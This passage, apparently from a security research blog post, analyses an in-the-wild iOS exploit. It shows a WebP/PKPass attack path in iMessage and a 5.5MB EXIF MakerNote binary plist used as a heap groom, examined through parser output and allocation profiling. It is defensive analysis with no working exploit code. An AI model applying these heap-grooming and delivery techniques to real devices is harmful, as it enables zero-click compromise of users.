 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The PKPass file and the images enclosed within &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c25&quot;&gt;do&lt;/span&gt;&lt;span&gt;&amp;nbsp;get parsed inside the BlastDoor sandbox and that&amp;#39;s where the crashes occur or the payload executes &amp;mdash; later on we&amp;#39;ll also see evidence that the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;NSExpression&lt;/span&gt;&lt;span&gt;&amp;nbsp;payload which eventually gets evaluated expects to be running &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c25&quot;&gt;inside&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;BlastDoor.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;My guess is that CVE-2023-41061 is more likely referring to the lax parsing of PKPasses which didn&amp;#39;t reject images which weren&amp;#39;t &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;png&amp;#39;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;s.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;In late 2024&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, I received another set of in-the-wild crash logs including two which do in fact strongly indicate that there was also a path to hit the WebP vulnerability in the MobileSMS process, outside the BlastDoor sandbox! Interestingly, the timestamps indicate that these devices were targeted in November 2023, two months after the vulnerability was patched.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;In those cases the WebP code was reached inside the MobileSMS process via a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;ChatKit&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CKPassPreviewMediaObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;created by a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CKAttachmentMessagePartChatItem&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.le24xell6lgv&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;What&amp;#39;s in a WebP?&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;I mentioned that the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;VP8L&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;chunk in the WebP file is only around 1KB. Yet in the file listing above the WebP file is 5.5MB! So what&amp;#39;s in the rest of it? Expanding out my WebP parser we see that there&amp;#39;s one more RIFF chunk:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;EXIF : 0x586bb8&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;exif is Intel byte alignment&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;EXIF has n_entries=1&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;tag=8769 fmt=4 n_components=1 data=1a&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;subIFD has n_entries=1&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;tag=927c fmt=7 n_components=586b8c data=2c&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;It&amp;#39;s a (really really huge) &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Exif&quot;&gt;EXIF&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;- the standard format which cameras use to store image metadata &amp;mdash; stuff like the camera model, exposure time, f-stop etc.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;It&amp;#39;s a tag-based format and pretty much all 5.5MB is inside one tag with the id &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x927c&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;. So what&amp;#39;s that?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Looking through an &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://www.awaresystems.be/imaging/tiff/tifftags/privateifd/exif.html&quot;&gt;online list of EXIF tags&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;just below the lens FocalLength tag and above the UserComment tag we spot &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x927c&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4qMYlckEAJZhphzfIDHw4kQg6htOmpV99VYzwChysKpCA9l6gNZriWUdWxws3xcVGIq7Hl3WNtBmNdXLQC6ezsQ6lPjdRHhv2z9LHCXhWPwTuSnxJGURaDEhBz_ZjjPLviIO3Y87lo3VHmTFyLhONCSE_RAWzZ6-iVm-Yub5AQ5Q5wo2K31SZBdvL83s/s1999/image4.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4qMYlckEAJZhphzfIDHw4kQg6htOmpV99VYzwChysKpCA9l6gNZriWUdWxws3xcVGIq7Hl3WNtBmNdXLQC6ezsQ6lPjdRHhv2z9LHCXhWPwTuSnxJGURaDEhBz_ZjjPLviIO3Y87lo3VHmTFyLhONCSE_RAWzZ6-iVm-Yub5AQ5Q5wo2K31SZBdvL83s/s1200/image4.png&quot; border=&quot;0&quot; alt=&quot;Screenshot of a table listing EXIF tag definitions. The table includes columns for tag number, tag name, and description. The row for tag number 0x927C with the tag name &amp;#39;MakerNote&amp;#39; is highlighted in red, with the description &amp;#39;Manufacturer specific information&amp;#39;.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Screenshot of a table listing EXIF tag definitions. The table includes columns for tag number, tag name, and description. The row for tag number 0x927C with the tag name &amp;#39;MakerNote&amp;#39; is highlighted in red, with the description &amp;#39;Manufacturer specific information&amp;#39;.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;It&amp;#39;s the very-vague-yet-fascinating sounding: &amp;quot;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;MakerNote - Manufacturer specific information.&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Looking to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Exif&quot;&gt;Wikipedia for some clarification&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;on what that actually is, we learn that &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c37 XQFzMDWmii-c26 XQFzMDWmii-c24&quot;&gt;&amp;quot;the &amp;quot;MakerNote&amp;quot; tag contains information normally in a proprietary binary format.&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Modifying the webp parser to now dump out the MakerNote tag we see:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;$ file sample.makernote &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;sample.makernote: Apple binary property list&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Apple&amp;#39;s chosen format for the &amp;quot;proprietary binary format&amp;quot; is binary plist!&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;And indeed: looking through the ImageIO library in IDA there&amp;#39;s a clear path between the WebP parser, the EXIF parser, the MakerNote parser and the binary plist parser.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.9tu54e9o1ow0&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;unbplisting&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;I covered the binary plist format in &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2023/10/an-analysis-of-an-in-the-wild-ios-safari-sandbox-escape.html&quot;&gt;a previous blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. That was the second time I&amp;#39;d had to analyse a large bplist. The first time (for the FORCEDENTRY sandbox escape) it was possible mostly by hand, just using the human-readable output of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;plutil&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;. Last year, for the Safari sandbox escape analysis, the bplist was 437KB and I had to write a custom bplist parser to figure out what was going on. Keeping the exponential curve going this year the bplist was 10x larger again.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;In this case it&amp;#39;s fairly clear that the bplist must be a heap groom - and at 5.5MB, presumably a fairly complicated one. So what&amp;#39;s it doing?&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.dwp3fpvl5otv&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Switching Views&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;I had a hunch that the bplist would use duplicate dictionary keys as a fundamental building block for the heap groom, but running my parser it didn&amp;#39;t output any... until I realised that my tool stored the parsed dictionaries directly as python dictionaries before dumping them. Fixing the tools to instead keep lists of keys and values it became clear that there were duplicate keys. Lots of them:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhi8ixELdnlgPEAlry1qJUaZAL0gu_lmlCy2OFHIpWIe3Jdmc89ST1jaPfEyInzGSxxUEbtX5L0dk5d5Z9L1RPSpDS0FDG_PJtCfy-HLcQBMYHZNokkE1XEgizDmBr_5Sww7JxA7joYE7zI0fMbuUt-34d5pXHAHSplO9t7lhzRMk7NObBmdIaPGkEe4eY/s1999/image6.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhi8ixELdnlgPEAlry1qJUaZAL0gu_lmlCy2OFHIpWIe3Jdmc89ST1jaPfEyInzGSxxUEbtX5L0dk5d5Z9L1RPSpDS0FDG_PJtCfy-HLcQBMYHZNokkE1XEgizDmBr_5Sww7JxA7joYE7zI0fMbuUt-34d5pXHAHSplO9t7lhzRMk7NObBmdIaPGkEe4eY/s1200/image6.png&quot; border=&quot;0&quot; alt=&quot;Screenshot of code showing a series of nested dictionary creations / duplicate keys&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Screenshot of code showing a series of nested dictionary creations / duplicate keys&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;In the Safari exploit writeup I described how I used different visualisation techniques to try to explore the structure of the objects, looking for patterns I could use to simplify what was going on. In this case, modifying the parser to emit well-formed curly brackets and indentation then relying on &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;VS Code&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;#39;s automatic code-folding proved to work well enough for browsing around and getting a feel for the structure of the groom object.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Sometimes the right visualisation technique is sufficient to figure out what the exploit is trying to do. In this case, where the primitive is a heap-based buffer overflow, the groom will inevitably try to put two things next to each other in memory and I want to know &amp;quot;what two things?&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;But no matter how long I stared and scrolled, I couldn&amp;#39;t figure anything out. Time to try something different.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.qsa5rb3wbgxp&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Instrumentation&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;I wrote a small helper to load the bplist using the same API as the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;MakerNote&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;parser and ran it using the Mac Instruments app:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioXK-ctrJxcKGIj-UEWZpLrFDR6z8L4jtEne1cJrcBpAEM_jYaHWn1NaQ_-DEAf7kZ8PSgrk1pzy11pe9TGfurgmHfFwW3MezoSrdZ_KQJzMUEIjkiL7mWt-gE-3XOiK1ooX7AibTNufcXkAjlWqS-x87ld2xLNm7sDygVVgduf_npeudyoA0645BDRuw/s1999/image1.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioXK-ctrJxcKGIj-UEWZpLrFDR6z8L4jtEne1cJrcBpAEM_jYaHWn1NaQ_-DEAf7kZ8PSgrk1pzy11pe9TGfurgmHfFwW3MezoSrdZ_KQJzMUEIjkiL7mWt-gE-3XOiK1ooX7AibTNufcXkAjlWqS-x87ld2xLNm7sDygVVgduf_npeudyoA0645BDRuw/s1200/image1.png&quot; border=&quot;0&quot; alt=&quot;Screenshot of Instruments app showing memory allocation with detailed information for the top three categories: &amp;#39;All Heap &amp;amp; Anonymous...&amp;#39;, &amp;#39;CFString (store)&amp;#39;, and &amp;#39;Malloc 16.00 KiB&amp;#39;&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Screenshot of Instruments app showing memory allocation with detailed information for the top three categories: &amp;#39;All Heap &amp;amp; Anonymous...&amp;#39;, &amp;#39;CFString (store)&amp;#39;, and &amp;#39;Malloc 16.00 KiB&amp;#39;&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Parsing the single 5.5MB bplist causes nearly half a million allocations, churning through nearly a gigabyte of memory. Just looking through this allocation summary it&amp;#39;s clear there&amp;#39;s lots of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFString&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFData&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;objects, likely used for heap shaping. Looking further down the list there are other interesting numbers:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTNContQj1sCDNIzAplyRVfRMR6y1vgjkGkRBbKXdlIrmiVV90kTNmxSvWwcv4iQ7Ju6W_bbrmqoh7k7UoTvytds40F1p7WUWhGmMtk8a5LfZuVNt7P1VjwZJ980-Xee42x_rNEK_HTmGSkPy8xucdhd0eyHj5XCcH3PwPfN5ZmzbNXR0hu_T6UNwZlbE/s1428/image11.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTNContQj1sCDNIzAplyRVfRMR6y1vgjkGkRBbKXdlIrmiVV90kTNmxSvWwcv4iQ7Ju6W_bbrmqoh7k7UoTvytds40F1p7WUWhGmMtk8a5LfZuVNt7P1VjwZJ980-Xee42x_rNEK_HTmGSkPy8xucdhd0eyHj5XCcH3PwPfN5ZmzbNXR0hu_T6UNwZlbE/s1200/image11.png&quot; border=&quot;0&quot; alt=&quot;Memory allocation table showing &amp;#39;All Heap &amp;amp; Anonymous...&amp;#39; using 990.66 MiB of total bytes, with 660.77 MiB being persistent.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Memory allocation table showing &amp;#39;All Heap &amp;amp; Anonymous...&amp;#39; using 990.66 MiB of total bytes, with 660.77 MiB being persistent.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;20&amp;#39;000&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the last line is far too round a number to be a coincidence. This number matches up with the number of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;__NSDictionaryM&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;objects allocated:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFVqxOaJc8pyHBEa74GIoOpG-Y7TbNOvBcaslTYe3e-sFEe7nW2GjN4YA0xlKhmd0FT8c1vCkY5OwWtGdsO_tGDic8CZC3jHHe9HKy33YMGRrdp_yyPUvdtOQkaL3kVTV1p8eZT_LzWsKoCSOZIFVd_t3zszVFhlQhYARImnbr7sKHO7n56fDyEKmQmGA/s1510/image7.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFVqxOaJc8pyHBEa74GIoOpG-Y7TbNOvBcaslTYe3e-sFEe7nW2GjN4YA0xlKhmd0FT8c1vCkY5OwWtGdsO_tGDic8CZC3jHHe9HKy33YMGRrdp_yyPUvdtOQkaL3kVTV1p8eZT_LzWsKoCSOZIFVd_t3zszVFhlQhYARImnbr7sKHO7n56fDyEKmQmGA/s1200/image7.png&quot; border=&quot;0&quot; alt=&quot;Table displaying memory usage broken down by allocation size, showing the number of allocations, the size of each allocation, and the total memory used for each size. In the middle of the image, there are 20000 __NSDictionaryM objects allocated.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Table displaying memory usage broken down by allocation size, showing the number of allocations, the size of each allocation, and the total memory used for each size. In the middle of the image, there are 20000 __NSDictionaryM objects allocated.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Finally, at the very bottom of the list there are two more allocation patterns which stand out:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqhUsJFzltLPjA4xT4zUvWvbkRNrboNac_h7srw04M3PhAisiqgVw5EmdczdjaCP7sDwUwfqU1TR6d27MY0EzAEHOwGfWz6mNx2GJJmRyKEmY_JeV8Mvtzx41up9VSGRV3d9kYbKB4DZ8bNXkwQc0wCUR7BFU445qNnY2-euwBgJIu2p_-re5PXC7hEx8/s1622/image9.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqhUsJFzltLPjA4xT4zUvWvbkRNrboNac_h7srw04M3PhAisiqgVw5EmdczdjaCP7sDwUwfqU1TR6d27MY0EzAEHOwGfWz6mNx2GJJmRyKEmY_JeV8Mvtzx41up9VSGRV3d9kYbKB4DZ8bNXkwQc0wCUR7BFU445qNnY2-euwBgJIu2p_-re5PXC7hEx8/s1200/image9.png&quot; border=&quot;0&quot; alt=&quot;Screenshot of a table listing memory allocations with details like size, count, and total bytes, highlighting two sets of very large allocations: eighty 1MB allocations and 44 4MB ones.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Screenshot of a table listing memory allocations with details like size, count, and total bytes, highlighting two sets of very large allocations: eighty 1MB allocations and 44 4MB ones.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;There are two sets of very large allocations: eighty 1MB allocations and 44 4MB ones.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;I modified my bplist tool again to dump out each unique string or data buffer, along with a count of how many times it was seen and its hash. Looking through the file listing there&amp;#39;s a clear pattern:&lt;/span&gt;&lt;/p&gt;
